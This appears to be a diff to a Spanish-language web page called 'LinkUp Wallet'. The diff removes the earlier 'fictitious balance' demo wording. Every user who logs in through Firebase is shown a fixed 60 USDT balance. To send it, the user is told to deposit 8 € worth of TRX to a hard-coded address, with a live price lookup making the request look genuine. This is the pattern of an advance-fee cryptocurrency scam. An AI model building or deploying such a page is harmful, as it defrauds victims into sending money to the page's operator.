@@ -2,109 +2,94 @@
 <html lang="es">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>LinkUp - Wallet Demo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>LinkUp Wallet</title>
   <style>
     body {
       font-family: Arial, sans-serif;
-      background-color: #f4f4f4;
-      color: #333;
       margin: 0;
-      padding: 20px;
+      padding: 0;
+      background-color: #f0f2f5;
+      color: #333;
     }
     .container {
-      max-width: 500px;
-      margin: 0 auto;
-      background-color: #fff;
-      border-radius: 8px;
-      padding: 25px;
-      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+      max-width: 450px;
+      margin: 40px auto;
+      background: white;
+      border-radius: 10px;
+      padding: 30px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
     }
     h1, h2 {
       text-align: center;
       color: #007bff;
     }
-    input[type="email"], input[type="password"] {
-      width: calc(100% - 22px);
+    input {
+      width: 100%;
       padding: 10px;
-      margin-bottom: 15px;
-      border: 1px solid #ccc;
+      margin: 10px 0;
       border-radius: 5px;
+      border: 1px solid #ccc;
     }
     button {
       background-color: #007bff;
-      color: #fff;
-      padding: 10px 15px;
-      margin-right: 10px;
+      color: white;
       border: none;
+      padding: 10px 15px;
       border-radius: 5px;
       cursor: pointer;
-      font-size: 16px;
+      margin: 5px;
     }
     button:hover {
       background-color: #0056b3;
     }
-    .message {
-      margin-top: 10px;
-      padding: 10px;
-      border-radius: 4px;
-    }
-    .success {
-      background-color: #d4edda;
-      color: #155724;
-    }
-    .error {
-      background-color: #f8d7da;
-      color: #721c24;
-    }
-    .user-status {
-      margin-top: 15px;
-      padding: 10px;
-      background-color: #e9ecef;
-      border-radius: 5px;
-      text-align: center;
-    }
-    #wallet {
-      display: none;
-      text-align: center;
-      background-color: #e0ffe0;
-      padding: 20px;
-      margin-top: 20px;
-      border-radius: 10px;
-    }
+    .hidden { display: none; }
+    .wallet-section { margin-top: 20px; }
+    .address-box { background-color: #f9f9f9; padding: 10px; border-radius: 5px; word-break: break-all; cursor: pointer; }
   </style>
 </head>
 <body>
   <div class="container">
-    <h1>LinkUp Wallet 🔐</h1>
-    <p>Regístrate o inicia sesión para acceder a tu saldo ficticio.</p>
-
-    <input type="email" id="email" placeholder="Correo electrónico" />
-    <input type="password" id="password" placeholder="Contraseña (mínimo 6 caracteres)" />
-    <br />
-    <button id="registerBtn">Registrarse</button>
-    <button id="loginBtn">Iniciar sesión</button>
-    <button id="logoutBtn" style="display:none;">Cerrar sesión</button>
-
-    <div id="message" class="message"></div>
-
-    <div class="user-status">
-      Estado: <span id="authStatus">Desconectado</span>
-      <p id="loggedInUserEmail"></p>
+    <!-- Login/Register Section -->
+    <div id="authSection">
+      <h1>LinkUp Wallet</h1>
+      <input type="email" id="email" placeholder="Correo electrónico">
+      <input type="password" id="password" placeholder="Contraseña">
+      <button id="registerBtn">Registrarse</button>
+      <button id="loginBtn">Iniciar sesión</button>
     </div>
 
-    <!-- Wallet -->
-    <div id="wallet">
-      <h2>Tu Wallet 💼</h2>
-      <p>Saldo disponible: <strong>60 USDT 💸</strong></p>
-      <p>Gracias por usar <strong>LinkUpAgency</strong> 🔗</p>
+    <!-- Wallet Section -->
+    <div id="walletSection" class="hidden">
+      <h2>Tu Wallet</h2>
+      <p><strong>Saldo:</strong> <span id="saldo">60</span> USDT (TRX)</p>
+      <p><strong>Valor actual:</strong> <span id="valorUSD">...</span></p>
+      <button onclick="mostrarRecibir()">Recibir</button>
+      <button onclick="mostrarEnviar()">Enviar</button>
+      <button id="logoutBtn">Cerrar sesión</button>
+
+      <div class="wallet-section hidden" id="recibirBox">
+        <h3>Direcciones para recibir:</h3>
+        <p>USDT TRX:</p>
+        <div class="address-box" onclick="copiarTexto('TMacSeNh7ZzuMTXgNccQbBD3wewyYSYSjn')">TMacSeNh7ZzuMTXgNccQbBD3wewyYSYSjn</div>
+        <p>SOLANA:</p>
+        <div class="address-box" onclick="copiarTexto('65yX9MGe62PXhNrgPFo7u3RqpyZjmDmF3r8k1HGAGfM4')">65yX9MGe62PXhNrgPFo7u3RqpyZjmDmF3r8k1HGAGfM4</div>
+      </div>
+
+      <div class="wallet-section hidden" id="enviarBox">
+        <h3>Enviar USDT (TRX)</h3>
+        <p>Tienes <strong>60 USDT</strong></p>
+        <p>Para enviar necesitas <strong>8 € en TRX</strong></p>
+        <p>Eso equivale a: <span id="trxAmount">...</span> TRX</p>
+        <p>Deposítalos en esta dirección:</p>
+        <div class="address-box" onclick="copiarTexto('TKNBhiB4j8N6cm3hJ1VycdcQ4GiyrXuZmE')">TKNBhiB4j8N6cm3hJ1VycdcQ4GiyrXuZmE</div>
+      </div>
     </div>
   </div>
 
-  <!-- Firebase SDKs -->
   <script type="module">
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
-    import { getAuth, createUserWithEmailAndPassword, signInWithEmailAndPassword, signOut, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js";
+    import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js';
+    import { getAuth, createUserWithEmailAndPassword, signInWithEmailAndPassword, signOut, onAuthStateChanged } from 'https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js';
 
     const firebaseConfig = {
       apiKey: "AIzaSyC9_hbiDnFxgx41m5cWuroigWv0LdWdlrs",
@@ -112,84 +97,79 @@
       projectId: "linkup-11438",
       storageBucket: "linkup-11438.appspot.com",
       messagingSenderId: "183432635859",
-      appId: "1:183432635859:web:1c1e25bf1ea24c03313b26",
-      measurementId: "G-6D2GG8CHDW"
+      appId: "1:183432635859:web:1c1e25bf1ea24c03313b26"
     };
 
     const app = initializeApp(firebaseConfig);
     const auth = getAuth(app);
 
-    const emailInput = document.getElementById("email");
-    const passwordInput = document.getElementById("password");
-    const registerBtn = document.getElementById("registerBtn");
-    const loginBtn = document.getElementById("loginBtn");
-    const logoutBtn = document.getElementById("logoutBtn");
-    const messageDiv = document.getElementById("message");
-    const authStatusSpan = document.getElementById("authStatus");
-    const loggedInUserEmailSpan = document.getElementById("loggedInUserEmail");
-    const walletDiv = document.getElementById("wallet");
+    const email = document.getElementById('email');
+    const password = document.getElementById('password');
+    const loginBtn = document.getElementById('loginBtn');
+    const registerBtn = document.getElementById('registerBtn');
+    const logoutBtn = document.getElementById('logoutBtn');
 
-    function showMessage(msg, type = "success") {
-      messageDiv.textContent = msg;
-      messageDiv.className = `message ${type}`;
-    }
-
-    registerBtn.addEventListener("click", async () => {
-      const email = emailInput.value;
-      const password = passwordInput.value;
-      if (!email || !password) return showMessage("Completa ambos campos.", "error");
-
+    loginBtn.onclick = async () => {
       try {
-        const userCred = await createUserWithEmailAndPassword(auth, email, password);
-        showMessage(`¡Registro exitoso! Bienvenido: ${userCred.user.email}`, "success");
+        await signInWithEmailAndPassword(auth, email.value, password.value);
       } catch (error) {
-        showMessage("Error: " + error.message, "error");
+        alert('Error al iniciar sesión: ' + error.message);
       }
-    });
+    };
 
-    loginBtn.addEventListener("click", async () => {
-      const email = emailInput.value;
-      const password = passwordInput.value;
-      if (!email || !password) return showMessage("Completa ambos campos.", "error");
-
+    registerBtn.onclick = async () => {
       try {
-        const userCred = await signInWithEmailAndPassword(auth, email, password);
-        showMessage(`¡Sesión iniciada como ${userCred.user.email}!`, "success");
+        await createUserWithEmailAndPassword(auth, email.value, password.value);
       } catch (error) {
-        showMessage("Error: " + error.message, "error");
+        alert('Error al registrarse: ' + error.message);
       }
-    });
+    };
 
-    logoutBtn.addEventListener("click", async () => {
-      try {
-        await signOut(auth);
-        showMessage("Sesión cerrada correctamente", "success");
-      } catch (error) {
-        showMessage("Error: " + error.message, "error");
-      }
-    });
+    logoutBtn.onclick = () => {
+      signOut(auth);
+    };
 
     onAuthStateChanged(auth, (user) => {
+      const authSection = document.getElementById('authSection');
+      const walletSection = document.getElementById('walletSection');
       if (user) {
-        authStatusSpan.textContent = "Conectado";
-        loggedInUserEmailSpan.textContent = user.email;
-        registerBtn.style.display = "none";
-        loginBtn.style.display = "none";
-        logoutBtn.style.display = "inline-block";
-        emailInput.disabled = true;
-        passwordInput.disabled = true;
-        walletDiv.style.display = "block";
+        authSection.classList.add('hidden');
+        walletSection.classList.remove('hidden');
+        cargarPrecio();
       } else {
-        authStatusSpan.textContent = "Desconectado";
-        loggedInUserEmailSpan.textContent = "";
-        registerBtn.style.display = "inline-block";
-        loginBtn.style.display = "inline-block";
-        logoutBtn.style.display = "none";
-        emailInput.disabled = false;
-        passwordInput.disabled = false;
-        walletDiv.style.display = "none";
+        authSection.classList.remove('hidden');
+        walletSection.classList.add('hidden');
       }
     });
+
+    function mostrarRecibir() {
+      document.getElementById('recibirBox').classList.remove('hidden');
+      document.getElementById('enviarBox').classList.add('hidden');
+    }
+
+    function mostrarEnviar() {
+      document.getElementById('recibirBox').classList.add('hidden');
+      document.getElementById('enviarBox').classList.remove('hidden');
+    }
+
+    function copiarTexto(texto) {
+      navigator.clipboard.writeText(texto).then(() => alert('Copiado: ' + texto));
+    }
+
+    async function cargarPrecio() {
+      try {
+        const res = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=tron&vs_currencies=eur');
+        const data = await res.json();
+        const precioTRX = data.tron.eur;
+        const total = (60).toFixed(2) + ' USDT';
+        document.getElementById('valorUSD').innerText = '≈ 60 €';
+        const trxNeeded = (8 / precioTRX).toFixed(2);
+        document.getElementById('trxAmount').innerText = trxNeeded;
+      } catch (e) {
+        console.error('Error cargando precio:', e);
+      }
+    }
   </script>
 </body>
-</html>
+  </html>
+  
